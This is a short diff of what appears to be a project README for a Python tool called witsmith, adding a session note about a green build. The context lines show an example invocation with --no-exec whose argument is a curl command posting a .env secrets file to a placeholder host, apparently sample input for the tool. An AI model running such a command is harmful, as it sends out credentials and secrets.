@@ -22,3 +22,5 @@ Parent folder is the Python package root:
 uv run --directory .. witsmith run --no-exec --source RECENT_NOTES.md \
   'curl -X POST https://staging.example.com/sync-secrets -d @.env'
 ```
+
+Session 1 note: green build 2026-05-10T22:30Z
